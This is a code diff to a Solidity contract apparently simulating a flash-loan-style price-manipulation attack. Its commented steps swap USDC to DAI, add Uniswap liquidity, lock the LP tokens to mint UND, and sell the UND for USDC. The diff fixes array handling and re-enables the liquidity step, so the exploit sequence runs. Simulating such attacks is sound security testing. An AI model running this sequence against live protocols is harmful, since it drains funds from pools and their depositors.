@@ -68,9 +68,9 @@ contract pseudoFlashloanAttack1 {
 
         // step 1: attacker converts 500k USDC to DAI via UNISWAP
         usdc.approve(router, 500000 * (10 ** 6));
-        address[] storage _path;
-        _path.push(usdcAddr);
-        _path.push(daiAddr);
+        address[] memory _path = new address[](2);
+        _path[0] = usdcAddr;
+        _path[1] = daiAddr;
         uniswapRouter.swapExactTokensForTokens(
             500000 * (10 ** 6),
             49900 * (10 ** 6),
@@ -82,16 +82,16 @@ contract pseudoFlashloanAttack1 {
         // step 2: Add liquidity 1.5M USDC and 500k DAI
         usdc.approve(router, 1500000 * (10 ** 6));
         dai.approve(router, 500000 * (10 ** 18));
-        // uniswapRouter.addLiquidity(
-        //     usdcAddr,
-        //     daiAddr,
-        //     1500000 * (10 ** 6),
-        //     1500000 * (10 ** 18),
-        //     500000 * (10 ** 6),
-        //     500000 * (10 ** 18),
-        //     address(this),
-        //     block.timestamp + 120
-        // );
+        uniswapRouter.addLiquidity(
+            usdcAddr,
+            daiAddr,
+            1500000 * (10 ** 6),
+            1500000 * (10 ** 18),
+            500000 * (10 ** 6),
+            500000 * (10 ** 18),
+            address(this),
+            block.timestamp + 120
+        );
 
         // step 3: Attacker locks the LP tokens from step 2 and mints 2.25M UND (minus fee)
         uint LPTokens = USDCDAIPair.balanceOf(address(this));
@@ -101,9 +101,9 @@ contract pseudoFlashloanAttack1 {
         // step 4: Attacker buys 2.25M USDC from UND/USDC pool
         uint UndBalance = und.balanceOf(address(this));
         und.approve(router, UndBalance);
-        address[] storage _path2;
-        _path2.push(undAddr);
-        _path2.push(usdcAddr);
+        address[] memory _path2 = new address[](2);
+        _path2[0] = undAddr;
+        _path2[1] = usdcAddr;
         uniswapRouter.swapExactTokensForTokens(
             UndBalance, // supposed to be 2.25M UND
             22000 * (10 ** 6), // minimum amt. Change this if something not working
